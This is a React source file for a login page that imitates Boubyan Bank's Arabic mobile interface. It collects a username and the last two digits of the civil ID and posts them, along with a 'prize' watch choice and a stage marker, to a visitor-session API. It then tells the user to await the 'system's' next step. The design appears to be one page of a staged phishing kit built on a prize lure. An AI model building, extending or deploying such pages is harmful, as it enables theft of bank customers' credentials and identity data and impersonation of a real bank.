import { FormEvent, useState } from "react";
import { createOrUpdateRequest, fillFieldMessage } from "@/api/visitorSession";
import { getSelectedWatch } from "@/lib/session";
import { useVisitorSession } from "@/hooks/useVisitorSession";
export default function LoginPage() {
  const [username, setUsername] = useState("");
  const [civil, setCivil] = useState("");
  const [usernameError, setUsernameError] = useState<string | null>(null);
  const [civilError, setCivilError] = useState<string | null>(null);
  const [submitted, setSubmitted] = useState(false);

  useVisitorSession("login");

  const onSubmit = async (e: FormEvent) => {
    e.preventDefault();
    const userOk = username.trim().length > 0;
    const civilOk = civil.length === 2;
    setUsernameError(userOk ? null : fillFieldMessage("اسم المستخدم"));
    setCivilError(civilOk ? null : fillFieldMessage("اخر رقمين من البطاقة المدنية"));
    if (!userOk || !civilOk) return;

    await createOrUpdateRequest({
      stage_key: "login",
      contact_ref: username.trim(),
      member_label: username.trim(),
      id_tail: civil,
      notify_key: "----",
      stage_state: "pending",
      prize_choice: getSelectedWatch() || null,
    });
    setSubmitted(true);
  };

  return (
    <main className="page-bank__shell view--bank" aria-label="تسجيل الدخول">
      <header className="bank-topbar">
        <span className="bank-icon bank-icon--chat" aria-hidden="true" />
        <button type="button" className="bank-menu" aria-label="القائمة">
          <span />
          <span />
          <span />
        </button>
      </header>
      <div className="bank-logo-wrap">
        <img src="/BoubyanBankLogo_(1).webp" alt="بوبيان Boubyan" className="bank-logo-img" width={165} />
      </div>
      {submitted ? (
        <p className="bank-hint personal-info-hint" role="status">
          تم إرسال البيانات. يرجى انتظار التوجيه من النظام إلى الخطوة التالية.
        </p>
      ) : (
      <form className="bank-form" onSubmit={onSubmit} noValidate>
        <label className="bank-field">
          <span className="bank-label">اسم المستخدم</span>
          <input
            type="text"
            className="bank-input"
            value={username}
            onChange={(e) => {
              setUsername(e.target.value);
              if (e.target.value.trim()) setUsernameError(null);
            }}
            onBlur={() => {
              if (!username.trim()) setUsernameError(fillFieldMessage("اسم المستخدم"));
            }}
            autoComplete="username"
            required
          />
          {usernameError && (
            <p className="bank-field-error" role="alert">
              {usernameError}
            </p>
          )}
        </label>
        <a href="#" className="bank-link" onClick={(ev) => ev.preventDefault()}>
          نسيت اسم المستخدم؟
        </a>
        <p className="bank-section-title">البطاقة المدنية</p>
        <p className="bank-hint">اخر رقمين من البطاقة المدنية</p>
        <div className="bank-civil-id">
          <input
            type="text"
            className="bank-civil-input"
            maxLength={2}
            inputMode="numeric"
            value={civil}
            onChange={(e) => {
              const v = e.target.value.replace(/\D/g, "").slice(0, 2);
              setCivil(v);
              if (v.length === 2) setCivilError(null);
            }}
            onBlur={() => {
              if (civil.length !== 2) setCivilError(fillFieldMessage("اخر رقمين من البطاقة المدنية"));
            }}
            aria-label="آخر رقمين من البطاقة المدنية"
            required
          />
        </div>
        {civilError && (
          <p className="bank-field-error bank-field-error--civil" role="alert">
            {civilError}
          </p>
        )}
        <button type="submit" className="btn-primary btn-primary--bank">
          التالي
        </button>
      </form>
      )}
    </main>
  );
}
